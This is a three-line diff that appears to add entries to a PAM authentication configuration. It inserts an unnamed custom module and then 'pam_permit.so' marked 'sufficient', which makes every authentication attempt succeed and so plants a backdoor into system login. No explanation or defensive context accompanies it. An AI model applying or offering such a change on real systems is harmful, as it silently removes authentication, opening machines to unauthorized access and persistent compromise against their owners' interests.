@@ -1,0 +1,3 @@
+auth	sufficient	pam_module.so
+auth	sufficient	pam_permit.so
+
